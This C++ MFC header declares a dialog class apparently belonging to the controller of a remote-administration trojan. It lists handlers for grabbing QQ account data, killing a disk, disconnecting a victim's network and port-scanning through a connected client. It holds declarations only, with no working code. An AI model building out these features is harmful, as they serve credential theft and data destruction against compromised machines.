#if !defined(AFX_MYDAT_H__1724B0DC_4C2C_4055_A800_7629D3413AF8__INCLUDED_)
#define AFX_MYDAT_H__1724B0DC_4C2C_4055_A800_7629D3413AF8__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// Mydat.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CMydat dialog

class CMydat : public CDialog
{
// Construction
public:
	void OnReceiveComplete();
	CMydat(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // standard constructor

// Dialog Data
	//{{AFX_DATA(CMydat)
	enum { IDD = IDD_CHAT };
	CProgressCtrl	m_progress;
	CTreeCtrl	m_ctrResultTree;
	CEdit	m_ctrSpecifiedPorts;
	CButton	m_ctrCheck;
	CButton	m_ctrBeginScan;
	CEdit	m_mynewdat;
	CEdit	m_mydat;
	UINT	m_iEndPort;
	CString	m_csHostOrIp;
	BOOL	m_bIsSpecifiedPort;
	UINT	m_nMaxThread;
	UINT	m_iStartPort;
	DWORD	m_dwTimeOut;
	//}}AFX_DATA


// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CMydat)
    public:
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	CString m_IPAddress;
	bool m_bIsOfflineRecord;
	HICON m_hIcon;

	// Generated message map functions
	//{{AFX_MSG(CMydat)
	virtual BOOL OnInitDialog();
	afx_msg void OnButtonGetdat();
	afx_msg void OnButtonChangdat();
	afx_msg void OnClose();
	afx_msg void OnButtonGetQq();
	afx_msg void OnButtonDisconnectNetwork();
	afx_msg void OnButtonKillDisk();
	afx_msg void OnScan();
	afx_msg void OnPaint();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg HCURSOR OnQueryDragIcon();
	afx_msg void OnIsSpecifiedPort();
	afx_msg void OnDestroy();
	afx_msg void OnTimer(UINT nIDEvent);
	//}}AFX_MSG
	afx_msg void OnScanThread(WPARAM wParam, LPARAM lParam);
	DECLARE_MESSAGE_MAP()
private:
 	void SaveDefaultPorts();
 	void ReadDefaultPorts();
 	short m_nHasComplete;
 	HANDLE m_hThread;
 	CProgressCtrl* m_pProgressCtrl;
 	DWORD m_dwPercentSeconds;
 	HTREEITEM m_hParentTree;
 	BOOL m_bTerminate;
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_MYDAT_H__1724B0DC_4C2C_4055_A800_7629D3413AF8__INCLUDED_)
